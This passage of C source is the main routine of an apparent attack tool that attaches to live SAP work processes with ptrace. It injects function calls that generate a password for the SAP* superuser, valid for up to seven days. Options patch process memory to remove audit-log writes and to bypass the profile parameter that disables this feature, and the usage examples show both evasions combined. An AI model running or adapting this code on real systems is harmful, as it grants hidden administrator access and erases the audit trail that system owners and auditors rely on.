"                   per-task session state the way ThStart's own dispatch\n"
"                   loop does for this request type. Tested and confirmed\n"
"                   NOT sufficient by itself to fix the LocFunc_FillEnqueStruct\n"
"                   null-deref (see --fill-global-areas too) — kept in case a\n"
"                   different kernel build hits a genuinely different missing-\n"
"                   context crash that the live-recovery patch doesn't cover.\n"
"                   Off by default.\n"
"  --fill-global-areas  FALLBACK, not needed on tested builds — same status\n"
"                   as --set-session above. Calls dyGetGlobalAreas() (no\n"
"                   args) on the target work process immediately before\n"
"                   create_virtual_*; that's the function that populates the\n"
"                   per-task ABAP runtime-area pointers (user info/data, SAP\n"
"                   memory, ABAP logon memory) the enqueue-lock helper reads.\n"
"                   Tested and confirmed to hit its own SIGABRT (an internal\n"
"                   precondition inside one of its sub-calls) rather than\n"
"                   fixing anything — kept only as a documented fallback for\n"
"                   a future build where the root cause differs. Off by\n"
"                   default.\n"
"  --no-patch-enque-crash  On by default: the call runs and if it hits the\n"
"                   known null-deref inside LocFunc_FillEnqueStruct (an\n"
"                   enqueue-lock helper reached via a lazy crypto self-test\n"
"                   during password generation, unrelated to the actual HMAC\n"
"                   computation), verify the exact faulting instruction\n"
"                   shape live, zero its destination register, skip 3 bytes,\n"
"                   and resume. Self-contained: only intervenes when both\n"
"                   the address and instruction shape are live-verified, so\n"
"                   it's a no-op on builds/worker-states where the crash\n"
"                   doesn't happen (e.g. an already-warmed worker, or a\n"
"                   kernel build that never hits this path). Pass this flag\n"
"                   to disable it and see the raw crash instead.\n"
"  -e <path>      Path to disp+work binary for symbol resolution\n"
"  -p <hint>      Substring to filter disp+work exe path (multi-SID hosts)\n"
"  --pid <pid>    Target this PID directly, skipping the work-process scan\n"
"  --singlestep   Diagnostic: single-step the injected call, print last 32\n"
"                 RIPs leading up to a crash/trap (max 5000 steps)\n"
"  -q             Quiet — print only the 40-char password\n\n"
"Examples:\n"
"  %s -c 100 -v 10                              # standard, 10 min\n"
"  %s -c 100 -v 10 --no-audit                   # standard, no audit log entry\n"
"  %s -c 100 -v 10080 --bypass --no-audit       # 7 days, no audit log\n"
"  %s -c 100 -v 10080 --bypass -P 2 --no-audit  # 7 days, purpose 2, no audit\n"
"  %s -c 100 -v 10080 --bypass -P 2 --no-audit --no-profile-check\n"
"                                                # 7 days, purpose 2, no audit,\n"
"                                                # login/create_virtual_user_sapstar ignored\n"
"  %s -c 100 -q                                 # password only to stdout\n\n"
"ASLR: handled — base resolved from /proc/pid/maps each run.\n"
"Portability: ELF symbol table used when available (any kernel version);\n"
"             falls back to hardcoded offsets for kernel 916 stripped binaries.\n",
    p, p, p, p, p, p, p);
    exit(1);
}

/* ── main ────────────────────────────────────────────────────────────── */
int main(int argc, char *argv[]) {
    const char *client = "000";
    int  validity      = 10;
    int  bypass        = 0;
    int  purpose       = -1;   /* -1 = auto: 2 for normal, 1 for bypass */
    int  quiet         = 0;
    int  no_audit      = 0;
    int  no_profile_check = 0;
    const char *hint   = NULL;
    const char *elf_path = NULL;
    pid_t pid_override = 0;
    int  singlestep    = 0;
    int  force_legacy  = 0;
    int  set_session   = 0;
    int  fill_areas    = 0;
    int  patch_enque   = 1; /* on by default — only intervenes on a live-verified
                              * known-safe crash, no-op otherwise. See
                              * --no-patch-enque-crash to disable. */

    for (int i = 1; i < argc; i++) {
        if      (!strcmp(argv[i],"-c") && i+1<argc) { client   = argv[++i]; }
        else if (!strcmp(argv[i],"-v") && i+1<argc) { validity = atoi(argv[++i]); }
        else if (!strcmp(argv[i],"-P") && i+1<argc) { purpose  = atoi(argv[++i]); }
        else if (!strcmp(argv[i],"-e") && i+1<argc) { elf_path = argv[++i]; }
        else if (!strcmp(argv[i],"-p") && i+1<argc) { hint     = argv[++i]; }
        else if (!strcmp(argv[i],"--pid") && i+1<argc) { pid_override = (pid_t)atoi(argv[++i]); }
        else if (!strcmp(argv[i],"--singlestep"))    { singlestep = 1; }
        else if (!strcmp(argv[i],"--bypass"))        { bypass    = 1; }
        else if (!strcmp(argv[i],"--no-audit"))      { no_audit  = 1; }
        else if (!strcmp(argv[i],"--no-profile-check")) { no_profile_check = 1; }
        else if (!strcmp(argv[i],"--force-legacy-offsets")) { force_legacy = 1; }
        else if (!strcmp(argv[i],"--set-session"))   { set_session = 1; }
        else if (!strcmp(argv[i],"--fill-global-areas")) { fill_areas = 1; }
        else if (!strcmp(argv[i],"--no-patch-enque-crash")) { patch_enque = 0; }
        else if (!strcmp(argv[i],"-q"))              { quiet     = 1; }
        else if (!strcmp(argv[i],"-h"))              { usage(argv[0]); }
        else { fprintf(stderr,"Unknown: %s\n",argv[i]); usage(argv[0]); }
    }

    if (strlen(client) != 3) {
        fprintf(stderr, "[-] Client must be exactly 3 digits\n"); return 1;
    }
    if (!bypass && (validity < 10 || validity > 30)) {
        fprintf(stderr, "[-] Validity must be 10-30 without --bypass. "
                        "Use --bypass for extended range.\n"); return 1;
    }
    if (bypass && (validity < 0 || validity > 10080)) {
        fprintf(stderr,
            "[-] Validity must be 0-10080 min (7 days) with --bypass —\n"
            "    create_virtual_user_internal itself rejects anything outside\n"
            "    this range (rc=3 INVALID_VALIDITY) after attach/injection, so\n"
            "    this check catches it client-side first. Got %d.\n", validity);
        return 1;
    }
    if (purpose < 0) purpose = bypass ? 1 : 2;

    /* ── Enumerate all disp+work processes ──────────────────────────────── */
    pid_t pids[MAX_PIDS]; char exe_path[512] = {0};
    int npids = find_all_disp_work(hint, pids, exe_path);
    if (!npids) {
        fprintf(stderr, "[-] No disp+work process found — run as <sid>adm\n"); return 1;
    }
    if (!elf_path) elf_path = exe_path;

    /* ── Resolve symbols from ELF (version-independent) ─────────────── */
    const char *sym_names[] = { SYM_ANCHOR, SYM_SAPSTAR, SYM_INTERNAL,
                                 SYM_WHOAMI, SYM_VIRT_HDL, SYM_AUDIT_LOG,
                                 SYM_DISABLED, SYM_SET_SESSION, SYM_GLOBAL_AREAS,
                                 SYM_FILLENQUE, SYM_AUDIT_LOG_ALT };
    uintptr_t sym_off[11];
    elf_resolve_symbols(elf_path, sym_names, sym_off, 11);
    uintptr_t off_anchor   = sym_off[0];
    uintptr_t off_sapstar  = sym_off[1];
    uintptr_t off_internal = sym_off[2];
    uintptr_t off_whoami   = sym_off[3];
    uintptr_t off_vhdl     = sym_off[4];
    uintptr_t off_audit    = sym_off[5];
    uintptr_t off_disabled = sym_off[6];
    uintptr_t off_set_session = sym_off[7];
    uintptr_t off_global_areas = sym_off[8];
    uintptr_t off_fillenque = sym_off[9];
    uintptr_t off_audit_alt = sym_off[10];

    if (off_anchor && off_sapstar && off_internal) {
        if (!quiet) printf("[*] Symbols resolved from ELF\n");
    } else if (force_legacy) {
        if (!quiet) printf("[!] ELF symbols not found — --force-legacy-offsets given, "
                            "using kernel 916 offsets (UNSAFE on other kernel builds)\n");
        off_anchor   = NM_K916_ANCHOR;
        off_sapstar  = NM_K916_CREATE_SAPSTAR;
        off_internal = NM_K916_CREATE_INTERNAL;
        off_whoami   = NM_K916_WHOAMI;
        off_vhdl     = NM_K916_VIRT_USER_HDL;
        off_audit    = 0;  /* use hardcoded call-site offsets below */
    } else {
        fprintf(stderr,
            "[-] ELF symbol resolution failed for one or more of: %s, %s, %s\n"
            "    This binary is not the kernel-916 build the hardcoded fallback\n"
            "    offsets were reverse-engineered from (different kernel release/\n"
            "    patch level, e.g. 7.93 or a recompiled 9.x kernel). Blindly using\n"
            "    the fallback offsets on a mismatched binary calls into the wrong\n"
            "    address and corrupts the target process (observed: SIGSEGV deep in\n"
            "    disp+work, or a wild jump near the ELF load base).\n"
            "    Refusing to proceed. If you have verified this binary layout matches\n"
            "    kernel 916 (e.g. same build, just stripped symtab), re-run with\n"
            "    --force-legacy-offsets to override at your own risk.\n",
            SYM_ANCHOR, SYM_SAPSTAR, SYM_INTERNAL);
        return 1;
    }

    /*
     * Select the right process:
     *   - Dispatcher has whoami=0, VirtualUserHdl=NULL → will return INTERNAL_ERR
     *   - Dialog Work Process has whoami=1, VirtualUserHdl initialized → correct target
     *
     * We enumerate all disp+work PIDs, read whoami and VirtualUserHdl from each,
     * and pick a DIA work process (whoami=1) with initialized VirtualUserHdl.
     */
    pid_t pid;
    if (pid_override) {
        pid = pid_override;
        if (!quiet) printf("[*] --pid given, skipping scan, targeting PID %d directly\n", pid);
    } else {
        if (!quiet) printf("[*] Scanning %d disp+work process(es) for work process...\n", npids);
        /* Use any base temporarily for initial scan — each PID has its own base */
        pid = select_work_process(pids, npids, 0, off_whoami, off_vhdl, quiet);
        if (!pid) {
            fprintf(stderr, "[-] No initialized Dialog Work Process found.\n");
            fprintf(stderr, "    All VirtualUserHdl == NULL. Is SAP fully started?\n");
            fprintf(stderr, "    Tip: 'ps aux | grep disp+work' to list all WP PIDs.\n");
            return 1;
        }
    }

    uintptr_t base = get_exe_base(pid);
    if (!base) { fprintf(stderr,"[-] Cannot read /proc/%d/maps\n",pid); return 1; }
    if (!quiet) printf("[*] Using PID %d  base: 0x%lx  exe: %s\n", pid, base, exe_path);

    uintptr_t fn_sapstar  = base + off_sapstar;
    uintptr_t fn_internal = base + off_internal;
    uintptr_t fn_target   = bypass ? fn_internal : fn_sapstar;

    if (!quiet)
        printf("[*] %s @ 0x%lx (purpose=%d, validity=%d min)\n",
               bypass ? "create_virtual_user_internal" : "create_virtual_sapstar",
               fn_target, purpose, validity);

    /* ── Attach ───────────────────────────────────────────────────────── */
    if (ptrace(PTRACE_ATTACH, pid, 0, 0) < 0) {
        fprintf(stderr, "[-] ptrace attach failed: %s\n", strerror(errno));
        fprintf(stderr, "    Check /proc/sys/kernel/yama/ptrace_scope (need 0 or 1)\n");
        return 1;
    }
    waitpid(pid, NULL, 0);

    struct user_regs_struct saved;
    ptrace(PTRACE_GETREGS, pid, 0, &saved);

    uintptr_t syscall_site = find_syscall_site(pid, base, 0x100000);
    if (!syscall_site) {
        fprintf(stderr, "[-] No syscall instruction found in text\n");
        ptrace(PTRACE_SETREGS, pid, 0, &saved);  /* restore before detach — don't resume mid-injected-call */
        ptrace(PTRACE_DETACH, pid, 0, 0); return 1;
    }

    /* ── Allocate R/W scratch region (no PROT_EXEC — not needed) ───────────
     * mmap(PROT_RWX) is commonly blocked by SELinux, kernel hardening, or
     * memory protection policies on modern SAP hosts. We only need R/W:
     *   - data (client string, password output)
     *   - fresh stack for the injected function call
     * The INT3 return trap lives in the text section (planted via PTRACE_POKETEXT).
     *
     * Scratch layout (SCRATCH_SIZE = 1 MB):
     *   [+0x000]: char16_t client[3]  — input (6 bytes)
     *   [+0x100]: char16_t pw_buf[40] — output password (80 bytes)
     *   [+0x200 - end]: stack (grows down from scratch+SCRATCH_SIZE)
     */
    long scratch = inject_syscall(pid, &saved, syscall_site,
                                  9 /*mmap*/, 0, SCRATCH_SIZE,
                                  PROT_READ|PROT_WRITE,   /* no EXEC */
                                  MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if (scratch <= 0) {
        fprintf(stderr, "[-] mmap failed: %ld (%s)\n", scratch,
                scratch == -1  ? "EPERM — check SELinux/seccomp" :
                scratch == -12 ? "ENOMEM"  : "see errno");
        ptrace(PTRACE_SETREGS, pid, 0, &saved);  /* restore before detach — don't resume mid-injected-call */
        ptrace(PTRACE_DETACH, pid, 0, 0); return 1;
    }
    if (!quiet) printf("[*] R/W scratch (1MB): 0x%lx\n", scratch);

    /* Write client string to scratch */
    uint8_t init[0x200] = {0};
    uint16_t client_u16[3] = {0};
    to_utf16(client, client_u16, 3);
    memcpy(init, client_u16, sizeof(client_u16));   /* at scratch+0x000 */
    /* pw_buf at scratch+0x100 — already zeroed */

    if (mem_write_rw(pid, (uintptr_t)scratch, init, sizeof(init)) < 0) {
        fprintf(stderr, "[-] Failed to write data to scratch page\n");
        goto cleanup;
    }

    uintptr_t client_ptr = (uintptr_t)scratch + 0x000;
    uintptr_t pw_ptr     = (uintptr_t)scratch + 0x100;

    /*
     * Return trap: plant INT3 at `syscall_site` in text using PTRACE_POKETEXT.
     * The function's `ret` will pop [rsp] = syscall_site → INT3 → SIGTRAP.
     * PTRACE_POKETEXT bypasses r-x page permissions; process_vm_writev cannot.
     */
    uintptr_t trap_site = syscall_site;  /* reuse known-good text location */

    /* ── Optionally suppress audit log (--no-audit) ─────────────────────
     * virtual_user_audit_log_create is called unconditionally inside
     * create_virtual_user_internal at two sites:
     *   SUCCESS site  (nm 0xc7ef6f): after slot written + broadcast
     *   DISABLED site (nm 0xc7e889): only when purpose==2 + param disabled
     * We NOP both 5-byte `call rel32` instructions before invoking the
     * function and restore them immediately after.
     *
     * If ELF symbol resolution found virtual_user_audit_log_create, we
     * locate call sites dynamically by scanning create_virtual_user_internal
     * for `e8 XX XX XX XX` instructions that target the audit function.
     * Otherwise fall back to kernel 916 hardcoded nm offsets.
     */
    uintptr_t audit_site[2] = {0, 0};
    uint8_t   audit_orig[2][5];
    int       audit_count = 0;
    static const uint8_t nop5[5] = { 0x90, 0x90, 0x90, 0x90, 0x90 };

    if (no_audit) {
        if (off_audit) {
            /* Dynamic: scan create_virtual_user_internal body for calls to audit fn */
            uintptr_t fn_rt    = base + off_internal;
            uintptr_t audit_rt = base + off_audit;
            uint8_t   fbuf[0x1000];
            if (mem_read(pid, fn_rt, fbuf, sizeof(fbuf)) == 0) {
                for (size_t i = 0; i + 5 <= sizeof(fbuf) && audit_count < 2; i++) {
                    if (fbuf[i] != 0xe8) continue;
                    int32_t rel; memcpy(&rel, fbuf + i + 1, 4);
                    uintptr_t target = fn_rt + i + 5 + (uintptr_t)(intptr_t)rel;
                    if (target == audit_rt)
                        audit_site[audit_count++] = fn_rt + i;
                }
            }
        }
        if (audit_count == 0 && off_audit_alt) {
            /* Some builds don't wrap the audit write in a virtual_user_
             * audit_log_create helper at all — create_virtual_user_internal
             * calls the low-level writer (rsauwri2ex) directly. Same scan,
             * different target symbol. */
            uintptr_t fn_rt    = base + off_internal;
            uintptr_t audit_rt = base + off_audit_alt;
            uint8_t   fbuf[0x1000];
            if (mem_read(pid, fn_rt, fbuf, sizeof(fbuf)) == 0) {
                for (size_t i = 0; i + 5 <= sizeof(fbuf) && audit_count < 2; i++) {
                    if (fbuf[i] != 0xe8) continue;
                    int32_t rel; memcpy(&rel, fbuf + i + 1, 4);
                    uintptr_t target = fn_rt + i + 5 + (uintptr_t)(intptr_t)rel;
                    if (target == audit_rt)
                        audit_site[audit_count++] = fn_rt + i;
                }
            }
        }
        if (audit_count == 0 && force_legacy) {
            /* Fallback: kernel 916 hardcoded nm offsets. Only under
             * --force-legacy-offsets — these are absolute addresses from a
             * single reference build; on any other build/layout they land
             * in unrelated code and NOPing them corrupts the live process
             * (confirmed: on a 7.93 PL101 build, off_internal sits ~1.9MB
             * away from the 916 reference and neither hardcoded address is
             * even a `call` instruction there). The byte checks below are a
             * second line of defense in case the offsets happen to collide
             * with some unrelated `e8` byte by chance. */
            audit_site[0] = base + NM_K916_AUDIT_SUCCESS;
            audit_site[1] = base + NM_K916_AUDIT_DISABLED;
            audit_count   = 2;
        }
        if (audit_count == 0) {
            fprintf(stderr,
                "[-] --no-audit: couldn't locate the audit-log call site(s)\n"
                "    dynamically (virtual_user_audit_log_create symbol missing\n"
                "    on this build — it may have been renamed/refactored, e.g.\n"
                "    split into separate check/login functions). Refusing to\n"
                "    guess an offset — NOPing the wrong address corrupts the\n"
                "    live process. Re-run with --force-legacy-offsets to use\n"
                "    the kernel-916 hardcoded offsets anyway (unsafe here).\n");
            ptrace(PTRACE_SETREGS, pid, 0, &saved);  /* restore before detach — don't resume mid-injected-call */
            ptrace(PTRACE_DETACH, pid, 0, 0);
            return 1;
        }
        for (int i = 0; i < audit_count; i++) {
            peek_text_n(pid, audit_site[i], audit_orig[i], 5);
            if (audit_orig[i][0] != 0xe8) {
                fprintf(stderr,
                    "[-] --no-audit: expected `call` (0xe8) at 0x%lx, found 0x%02x.\n"
                    "    This address doesn't hold a call instruction on this\n"
                    "    binary — refusing to NOP it (would corrupt unrelated\n"
                    "    code). Aborting before any patch was applied.\n",
                    audit_site[i], audit_orig[i][0]);
                ptrace(PTRACE_SETREGS, pid, 0, &saved);  /* restore before detach — don't resume mid-injected-call */
                ptrace(PTRACE_DETACH, pid, 0, 0);
                return 1;
            }
            poke_text_n(pid, audit_site[i], nop5, 5);
        }
        if (!quiet) printf("[*] Audit log suppressed (%d call site(s) NOPed)\n", audit_count);
    }

    /* ── Optionally bypass login/create_virtual_user_sapstar (--no-profile-check) ──
     * One-byte patch: JE (0x74) -> JMP (0xEB) on the branch taken inside
     * create_virtual_user_internal when purpose==2 and the profile param is
     * NOT disabled. Forcing it unconditional makes the "allowed" path run
     * regardless of the profile param's value.
     *
     * Located dynamically: scan create_virtual_user_internal's body for
     * `call is_virtual_user_sapstar_disabled`, then the `test al,al ; je`
     * immediately after it (same technique as the --no-audit call-site scan).
     * A hardcoded relative byte offset from a single reference build breaks
     * across kernel patch levels/builds since even semantically-identical
     * code can shift by a few bytes — this scan is layout-independent as
     * long as the symbol and the compiler's test+je idiom are still there.
     */
    uintptr_t profile_site = 0;
    uint8_t   profile_orig = 0;
    if (no_profile_check) {
        if (off_disabled) {
            uintptr_t fn_rt       = base + off_internal;
            uintptr_t disabled_rt = base + off_disabled;
            uint8_t   fbuf[0x1000];
            if (mem_read(pid, fn_rt, fbuf, sizeof(fbuf)) == 0) {
                for (size_t i = 0; i + 5 <= sizeof(fbuf) && !profile_site; i++) {
                    if (fbuf[i] != 0xe8) continue;
                    int32_t rel; memcpy(&rel, fbuf + i + 1, 4);
                    uintptr_t target = fn_rt + i + 5 + (uintptr_t)(intptr_t)rel;
                    if (target != disabled_rt) continue;

                    /* Found the call; look for `test al,al` (84 c0) shortly
                     * after it, followed immediately by `je rel8` (74 xx). */
                    size_t call_end = i + 5;
                    for (size_t k = call_end; k + 4 <= sizeof(fbuf) && k < call_end + 16; k++) {
                        if (fbuf[k] == 0x84 && fbuf[k+1] == 0xc0 && fbuf[k+2] == 0x74) {
                            profile_site = fn_rt + k + 2;
                            break;
                        }
                    }
                }
            }
        } else {
            /* Symbol genuinely doesn't exist on this binary — most likely
             * this kernel predates SAP Note 3633474 (login/create_virtual_
             * user_sapstar, first shipped 7.93 PL321 / 9.16 PL60), so the
             * check itself doesn't exist yet. Nothing to bypass; that's a
             * fine outcome, not a scan failure — continue without patching
             * rather than aborting the whole run. */
            if (!quiet) printf(
                "[*] --no-profile-check: is_virtual_user_sapstar_disabled not found\n"
                "    on this binary — likely predates SAP Note 3633474 (login/\n"
                "    create_virtual_user_sapstar, 7.93 PL321 / 9.16 PL60). No\n"
                "    check exists to bypass here; continuing without patching.\n");
        }
        if (!profile_site && force_legacy) {
            profile_site = base + off_internal + NM_K916_PROFILE_CHECK_OFF;
        }
        if (!profile_site && off_disabled) {
            /* Symbol was found but the expected idiom near its call site
             * wasn't — an actual layout mismatch, not "feature absent".
             * Unsafe to guess; abort rather than silently doing nothing. */
            fprintf(stderr,
                "[-] --no-profile-check: is_virtual_user_sapstar_disabled exists\n"
                "    but the test+je idiom after its call site doesn't match —\n"
                "    a different kernel build/PL layout. Refusing to guess an\n"
                "    offset. Re-run with --force-legacy-offsets to use the\n"
                "    kernel-916 hardcoded offset anyway (unsafe on other builds).\n");
            ptrace(PTRACE_SETREGS, pid, 0, &saved);  /* restore before detach — don't resume mid-injected-call */
            ptrace(PTRACE_DETACH, pid, 0, 0);
            return 1;
        }
        if (profile_site) {
            peek_text_n(pid, profile_site, &profile_orig, 1);
            if (profile_orig != 0x74) {
                fprintf(stderr,
                    "[-] --no-profile-check: expected JE (0x74) at 0x%lx, found 0x%02x.\n"
                    "    Offset doesn't match this binary's layout — refusing to patch\n"
                    "    (would corrupt unrelated code). Aborting.\n",
                    profile_site, profile_orig);
                ptrace(PTRACE_SETREGS, pid, 0, &saved);  /* restore before detach — don't resume mid-injected-call */
                ptrace(PTRACE_DETACH, pid, 0, 0);
                return 1;
            }
            uint8_t jmp_byte = 0xEB;
            poke_text_n(pid, profile_site, &jmp_byte, 1);
            if (!quiet) printf("[*] login/create_virtual_user_sapstar check bypassed (1 byte patched)\n");
        }
    }

    /* ── Optionally populate ABAP runtime-area pointers (--fill-global-areas) ──
     * dyGetGlobalAreas() (no args) writes dyGetUsrInfo()/dyGetUsrData()/
     * dyGetSapMemory()/dySapMemorySize()/dyGetAbapLogonMemory() into the
     * zttaptr-based per-task struct (fields +0x130/+0x140/+0x100/+0x108/
     * +0x150). +0x140 (dyGetUsrData) is the exact field
     * LocFunc_FillEnqueStruct dereferences and crashes on when null — this
     * is the actual writer, found via disassembly, not inferred from a
     * neighboring-offset guess (unlike --set-session, which didn't fix it).
     */
    if (fill_areas) {
        if (!off_global_areas) {
            fprintf(stderr,
                "[-] --fill-global-areas: dyGetGlobalAreas symbol not found\n"
                "    on this binary (GCC isra-clone suffix may differ on this\n"
                "    build). No hardcoded fallback for this new feature.\n"
                "    Aborting.\n");
            ptrace(PTRACE_SETREGS, pid, 0, &saved);  /* restore before detach — don't resume mid-injected-call */
            ptrace(PTRACE_DETACH, pid, 0, 0);
            return 1;
        }
        int areas_ok = 0;
        call_in_target(pid, &saved, (uintptr_t)scratch, trap_site,
                        base + off_global_areas,
                        0, 0, 0, 0, singlestep, base, &areas_ok, 0, 0);
        if (!areas_ok) {
            fprintf(stderr,
                "[-] --fill-global-areas: dyGetGlobalAreas call didn't return\n"
                "    cleanly (see [debug] line above). Aborting rather than\n"
                "    proceeding into create_virtual_* on a possibly-corrupted\n"
                "    work process.\n");
            ptrace(PTRACE_SETREGS, pid, 0, &saved);  /* restore before detach — don't resume mid-injected-call */
            ptrace(PTRACE_DETACH, pid, 0, 0);
            return 1;
        }
        if (!quiet) printf("[*] dyGetGlobalAreas() primed\n");
    }

    /* ── Optionally prime per-task session state (--set-session) ────────
     * See DP_SESSION_INFO_NONE comment above: reproduces what ThStart's own
     * dispatch loop does for this request type before invoking the handler,
     * so create_virtual_sapstar's internal enqueue-lock helper
     * (LocFunc_FillEnqueStruct) finds a populated per-task context instead of
     * dereferencing a null field on an otherwise-idle worker.
     */
    if (set_session) {
        if (!off_set_session) {
            fprintf(stderr,
                "[-] --set-session: ThWpSetCurrentSession symbol not found on\n"
                "    this binary. Can't safely locate it without a hardcoded\n"
                "    offset (none exists for this new feature). Aborting.\n");
            ptrace(PTRACE_SETREGS, pid, 0, &saved);  /* restore before detach — don't resume mid-injected-call */
            ptrace(PTRACE_DETACH, pid, 0, 0);
            return 1;
        }
        int session_ok = 0;
        call_in_target(pid, &saved, (uintptr_t)scratch, trap_site,
                        base + off_set_session,
                        (uintptr_t)DP_SESSION_INFO_NONE, 0, 0, 0,
                        singlestep, base, &session_ok, 0, 0);
        if (!session_ok) {
            fprintf(stderr,
                "[-] --set-session: ThWpSetCurrentSession call didn't return\n"
                "    cleanly (see [debug] line above). Aborting rather than\n"
                "    proceeding into create_virtual_* on a possibly-corrupted\n"
                "    work process.\n");
            ptrace(PTRACE_SETREGS, pid, 0, &saved);  /* restore before detach — don't resume mid-injected-call */
            ptrace(PTRACE_DETACH, pid, 0, 0);
            return 1;
        }
        if (!quiet) printf("[*] ThWpSetCurrentSession(no-session) primed\n");
    }

    /* ── Enqueue-crash recovery window (on by default, --no-patch-enque-crash
     * to disable) ───────────────────────────────────────────────────────
     * Self-contained: if LocFunc_FillEnqueStruct doesn't resolve on this
     * binary, recovery just isn't available here — that's not an error,
     * it's the same as the crash never happening. call_in_target only ever
     * intervenes when it live-verifies both the address AND the exact
     * instruction shape, so leaving this off has zero effect on builds/
     * worker-states where the crash doesn't occur. */
    uintptr_t recover_lo = 0, recover_hi = 0;
    if (patch_enque && off_fillenque) {
        recover_lo = base + off_fillenque;
        recover_hi = recover_lo + FILLENQUE_WINDOW;
    }

    /* ── Call the function ────────────────────────────────────────────── */
    int rc = -1;
    if (bypass) {
        /*
         * create_virtual_user_internal(client[3]*, int16_t purpose,
         *                              int32_t validity, char16_t pw[40]*)
         * rdi=client_ptr  rsi=purpose  rdx=validity  rcx=pw_ptr
         *
         * login/create_virtual_user_sapstar is checked ONLY for purpose==2.
         * Using purpose=1 (default --bypass) skips that check entirely.
         */
        rc = call_in_target(pid, &saved, (uintptr_t)scratch, trap_site,
                            fn_target,
                            client_ptr, (uintptr_t)purpose, validity,
                            (long)pw_ptr, singlestep, base, NULL,
                            recover_lo, recover_hi);
    } else {
        /*
         * create_virtual_sapstar(client*, pw_buf*, int32_t validity)
         * rdi=client_ptr  rsi=pw_ptr  rdx=validity
         */
        rc = call_in_target(pid, &saved, (uintptr_t)scratch, trap_site,
                            fn_target,
                            client_ptr, pw_ptr, validity, 0, singlestep, base, NULL,
                            recover_lo, recover_hi);
    }

    /* ── Restore audit log call sites immediately after call ────────────── */
    if (no_audit) {
        for (int i = 0; i < audit_count; i++)
            poke_text_n(pid, audit_site[i], audit_orig[i], 5);
        if (!quiet) printf("[*] Audit log call sites restored\n");
    }

    /* ── Restore profile-param check immediately after call ─────────────── */
    if (no_profile_check && profile_site) {
        poke_text_n(pid, profile_site, &profile_orig, 1);
        if (!quiet) printf("[*] login/create_virtual_user_sapstar check restored\n");
    }

    /* ── Read and print password ──────────────────────────────────────── */
    if (rc == RC_OK) {
        uint16_t pw16[PW_BUF_CHARS] = {0};
        mem_read(pid, pw_ptr, pw16, sizeof(pw16));
        char pw[PW_BUF_CHARS + 1] = {0};
        from_utf16(pw16, pw, PW_BUF_CHARS);

        if (quiet) {
            printf("%s\n", pw);
        } else {
            printf("\n[+] Created successfully\n");
            printf("    Client:   %s\n", client);
            printf("    Purpose:  %d%s\n", purpose,
                   purpose == 2 ? " (SAP*)" :
                   purpose == 1 ? " (purpose-1 user)" : " (signing user)");
            printf("    Validity: %d min\n", validity);
            printf("    Password: %s\n\n", pw);
            printf("    SAP logon: user=SAP*, client=%s, password=%s\n", client, pw);
        }
    } else {
        static const char *msgs[] = {
            "OK","INTERNAL_ERR","PURPOSE_UNKNOWN","INVALID_VALIDITY",
            "RNG_ERR","RSEC_ERR","NO_SPACE","INVALID_CLIENT","CREATION_DISABLED"
        };
        const char *m = (rc>=0 && rc<=8) ? msgs[rc] : "UNKNOWN";
        fprintf(stderr, "[-] rc=%d (%s)\n", rc, m);
        if (rc==8) fprintf(stderr, "    Hint: login/create_virtual_user_sapstar disabled.\n"
                                   "    With --bypass, purpose=1 skips this check.\n"
                                   "    But purpose=1 requires username for purpose-1 to\n"
                                   "    exist in client %s.\n", client);
        if (rc==7) fprintf(stderr, "    Hint: client %s not found, or purpose-%d username\n"
                                   "    does not exist in this client.\n", client, purpose);
    }

cleanup:
    if (scratch > 0)
        inject_syscall(pid, &saved, syscall_site,
                       11 /*munmap*/, scratch, SCRATCH_SIZE, 0,0,0,0);
    ptrace(PTRACE_SETREGS, pid, 0, &saved);
    ptrace(PTRACE_DETACH,  pid, 0, 0);
    return (rc == RC_OK) ? 0 : 1;
}
